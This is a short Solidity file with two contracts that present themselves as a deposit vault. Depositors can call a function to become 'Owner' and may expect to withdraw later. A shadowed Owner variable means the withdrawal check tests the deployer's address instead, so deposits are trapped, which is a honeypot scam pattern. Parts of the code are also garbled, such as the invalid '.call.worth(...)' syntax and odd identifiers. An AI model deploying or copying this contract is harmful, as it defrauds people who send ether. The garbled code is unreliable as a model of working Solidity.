pragma solidity ^0.4.24;

contract PortalGate  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function shiftgoldLord(address _owner) public onlyOwner { Owner = _owner; }
    function portalGate(address aim, bytes info) public payable {
        aim.call.worth(msg.value)(info);
    }
}

contract BankwinningsProxy is PortalGate {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function JackpotVault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            bankWinnings();
        }
    }

    function bankWinnings() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function collectBounty(uint256 sum) public onlyOwner {
        if (sum>0 && Deposits[msg.sender]>=sum) {
            msg.sender.transfer(sum);
        }
    }
}